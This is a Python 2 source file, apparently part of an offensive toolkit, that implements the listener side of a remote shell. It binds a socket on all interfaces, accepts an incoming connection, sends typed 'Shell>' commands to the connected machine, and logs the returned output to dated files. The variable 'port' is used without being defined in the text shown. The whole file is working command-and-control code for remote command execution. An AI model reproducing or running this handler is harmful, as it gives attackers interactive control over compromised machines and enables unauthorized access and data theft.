import socket, os, sys
from subprocess import PIPE, Popen, call

date = Popen('date +"%m-%d-%y"', shell = True, stdout = PIPE).stdout.read().split('\n')[0]
c_time = Popen("date | awk '{print $4}'", shell = True, stdout = PIPE).stdout.read().split('\n')[0]

data = open('bin/data/'+str(date)+'/ntwrk_sc/Ntwrk_sc_'+str(c_time)+'.log','a')

def connect():
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    os.system('clear')
    print '\n\n\n            [+]\033[94m Listening For Incoming...\033[0;0m'
    conn, addr=s.accept()
    print '            [+] We got a connection from:', addr
    shellcommand(conn)

def shellcommand(conn):
    while True:
        command = raw_input('\n            Shell> ')
               
        if 'exit' in command:
            conn.send(command)
            conn.close()
            logout()
            break
        if 'clear' in command:
            os.system('clear')
            shellcommand(conn)
        else:
            conn.send(command)
            out = conn.recv(4096)
            
            while out!='':
                if out.startswith('cd/'):
                    data.write(out+'\n')
                    break
                elif out == ' ':
                    break

                else:
                    sys.stdout.write(out)
                    data.write(out)
                    out = conn.recv(4096)
            sys.stdout.write('\n')
            data.write('\n')
            shellcommand(conn)

def logout():
    print "            \033[92mSuccessfully\033[91m Logout\033[0;0m!"
    data.close()
    sys.exit()

